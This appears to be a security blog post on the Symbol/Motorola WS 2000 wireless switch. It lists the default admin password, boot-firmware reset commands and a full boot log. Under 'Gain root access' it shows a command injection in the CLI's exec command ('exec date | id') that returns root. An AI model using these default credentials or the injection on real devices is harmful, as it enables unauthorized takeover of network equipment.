---
layout: post
title: Motorola /  Symbol Wireless Switch WS 2000
date: !binary |-
  MjAwOS0wNC0yOCAxMjowMToyNiArMDIwMA==
date_gmt: !binary |-
  MjAwOS0wNC0yOCAxMDowMToyNiArMDIwMA==
categories:
- Security
tags: []
comments: []
---
<h2>Default password</h2><br />
username: admin
<p>password: symbol
<h2>Reset to factory default</h2><br />
<code>localhost login: NEW CFG BLOCK 0 : VALID<br />
NEW CFG BLOCK 1 : NOT VALID</code>
<p>WS 2000 Boot Firmware Version 2.2.3.0-020R<br />
Copyright(c) Symbol Technologies Inc. 2003. All rights reserved.
<p>Press escape key to run boot firmware ......
<p>boot> help
<p>boot> passwd default symbol<br />
boot> reset config<br />
boot> reset system
<p>resetting ...
<h2>Gain root access</h2><br />
WS 2000 Wireless Switch 2.2.3.0-020R<br />
Copyright (c) Symbol Technologies, Inc. 2003, 2004. All rights reserved.
<p>localhost login: admin<br />
Password:
<p><code>admin>system<br />
admin(system)>exec date | ls -alt /console<br />
drwxr-xr-x 1 root root 512 Jan 1 2003 .<br />
drwxr-xr-x 1 root root 512 Jan 1 2003 ..<br />
lrwxrwxrwx 1 root root 13 Jan 1 2003 arp -> /usr/sbin/arp<br />
lrwxrwxrwx 1 root root 22 Jan 1 2003 ccdiag -> /cellcontroller/ccdiag<br />
lrwxrwxrwx 1 root root 23 Jan 1 2003 ccstats -> /cellcontroller/ccstats<br />
-rwxr-xr-x 1 root root 2062 Jan 1 2003 cformat<br />
-rwxr-xr-x 1 root root 48 Jan 1 2003 cfumount<br />
-r-s--x--x 1 root root 36514 Jan 1 2003 cli<br />
lrwxrwxrwx 1 root root 9 Jan 1 2003 date -> /bin/date<br />
lrwxrwxrwx 1 root root 7 Jan 1 2003 df -> /bin/df<br />
lrwxrwxrwx 1 root root 11 Jan 1 2003 du -> /usr/bin/du<br />
-rwxr-xr-x 1 root root 2788 Jan 1 2003 ftp_cfg.sh<br />
-rwxr-xr-x 1 root root 2361 Jan 1 2003 ftp_core.sh<br />
lrwxrwxrwx 1 root root 14 Jan 1 2003 ifconfig -> /sbin/ifconfig<br />
lrwxrwxrwx 1 root root 12 Jan 1 2003 netstat -> /bin/netstat<br />
lrwxrwxrwx 1 root root 25 Jan 1 2003 peekshmem -> /cellcontroller/peekshmem<br />
lrwxrwxrwx 1 root root 9 Jan 1 2003 ping -> /bin/ping<br />
lrwxrwxrwx 1 root root 17 Jan 1 2003 tcpdump -> /usr/sbin/tcpdump<br />
-rwxr-xr-x 1 root root 2109 Jan 1 2003 tftp_cfg.sh<br />
lrwxrwxrwx 1 root root 20 Jan 1 2003 traceroute -> /usr/sbin/traceroute<br />
admin(system)>exec date | id<br />
uid=0(root) gid=100(users)<br />
</code>
<h2>Boot log</h2><br />
<code><br />
NEW CFG BLOCK 0 : VALID<br />
NEW CFG BLOCK 1 : NOT VALID</code>
<p>WS 2000 Boot Firmware Version 2.2.3.0-020R<br />
Copyright(c) Symbol Technologies Inc. 2003. All rights reserved.
<p>Press escape key to run boot firmware .............
<p>Power On Self Test
<p>testing ram : pass<br />
testing nor flash : pass<br />
testing nand flash : pass<br />
testing ethernet : pass
<p>Loading Linux Kernel<br />
Booting From 0x1160-0000 ...<br />
Uncompressing Linux............................................done.<br />
booting the kernel.<br />
Linux version 2.4.20_mvl31-ixdp4xx (root@mobion) (gcc version 3.3.1 (release/MontaVista 3.1)) #1 Mon June 7 10:00:00 PDT 2004<br />
CPU: XScale-IXP4xx/IXC11xx [690541c1] revision 1 (ARMv5TE)<br />
CPU: D undefined 5 cache<br />
CPU: I cache: 32768 bytes, associativity 32, 32 byte lines, 32 sets<br />
CPU: D cache: 32768 bytes, associativity 32, 32 byte lines, 32 sets<br />
Machine: Intel IXDP425 Development Platform<br />
On node 0 totalpages: 15360<br />
zone(0): 15360 pages.<br />
zone(1): 0 pages.<br />
zone(2): 0 pages.<br />
Kernel command line: mem=61440K console=ttyS1,19200 noinitrd rootflags=0 rootfstype=yaffs root=/dev/mtdblock0<br />
Calibrating delay loop... 532.48 BogoMIPS<br />
Memory: 59284KB available (1160K code, 237K data, 60K init)<br />
XScale cache_lock_init called<br />
Calling consistent alloc<br />
low_level_page initialized<br />
low_level_page @ 0xc4000000<br />
icache_lock_fn @ 0xc4000080<br />
dcache_lock_fn @ 0xc40000a0<br />
icache_unlock_fn @ 0xc4000098<br />
dcache_unlock_fn @ 0xc40000f0<br />
Initializing TLB locking<br />
TLB locking initialized<br />
Mount-cache hash table entries: 1024 (order: 1, 8192 bytes)<br />
Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)<br />
Page-cache hash table entries: 16384 (order: 4, 65536 bytes)<br />
POSIX conformance testing by UNIFIX<br />
Initializing RT netlink socket<br />
Starting kswapd<br />
Disabling the Out Of Memory Killer<br />
pty: 256 Unix98 ptys configured<br />
Creating 3 MTD partitions on "NAND 64MiB 3,3V":<br />
0x00000000-0x03c00000 : "SPIA flash partition 1"<br />
0x03c00000-0x03fe0000 : "SPIA flash partition 2"<br />
0x03fe0000-0x04000000 : "SPIA flash partition 3"<br />
NetWinder Floating Point Emulator V0.95 (c) 1998-1999 Rebel.com<br />
VFS: Mounted root (yaffs filesystem) readonly.<br />
serial console detected. Disabling virtual terminals.<br />
console=/dev/console<br />
init started: BusyBox v0.60.3 (2004.5.6-12:00 +0000) multi-call binary<br />
Starting pid 9, console /dev/console: '/etc/init.d/rcS'<br />
Activating swap...<br />
Mounting local filesystems...<br />
/dev/shm on /var/log type tmpfs (rw,size=512k)<br />
/dev/mtdblock1 on /save type yaffs (rw)<br />
Initializing random number generator... done.<br />
rm: cannot remove `/var/run/*.pid': No such file or directory<br />
Using cf.o<br />
Starting automount:[ OK ]<br />
Using cfgstat.o<br />
Testing Shadow Flash...passed<br />
Shadow Flash Init Test Passed<br />
Using lnkstat.o<br />
Using /lib/modules/2.4.20_mvl31-ixdp4xx/kernel/drivers/ixp400/ixp400.o<br />
Using throttle.o<br />
Using /lib/modules/2.4.20_mvl31-ixdp4xx/kernel/drivers/net/mobion_eth.o<br />
Initializing IXP425 NPE Ethernet driver software v. 1.1<br />
CPU clock speed (approx) = 532 MHz
<p>Using /lib/modules/2.4.20_mvl31-ixdp4xx/kernel/net/bridge/bridge.o<br />
Using shmemdev.o<br />
Using pktdrvr.o
<p>Starting Apache....<br />
start /apache/httpd<br />
Starting portmap....<br />
Starting inetd....<br />
Loading drivers ...<br />
Using igateway.o<br />
Using dhpktdrv.o<br />
Using drvpppoe.o<br />
Using l2tpdrv.o<br />
Using pptpdrv.o<br />
Using tcpmssmangler.o<br />
Starting iGateway Apps(1)....<br />
Starting iGateway Apps(2)....<br />
Using switch.o<br />
Starting Wireless Switch....<br />
Configuring iGateway....<br />
Creating config files....<br />
Starting SSHD....<br />
Starting snmpd:
<p>Starting keepalived....<br />
Starting Message Handler daemon<br />
Using led.o<br />
Starting pid 366, console /dev/console: '/sbin/agetty'<br />
Starting pid 367, console /dev/console: '/sbin/agetty'
<p>WS 2000 Wireless Switch 2.2.3.0-020R<br />
Copyright (c) Symbol Technologies, Inc. 2003, 2004. All rights reserved.
<p>localhost login: admin<br />
Password:<br />
Password is same as default password, please change the password<br />
Enter new password:<br />
Verify new password:<br />
Authentication tokens updated successfully<br />
Welcome to Symbol Technologies' WS 2000 Wireless Switch
<p>admin>
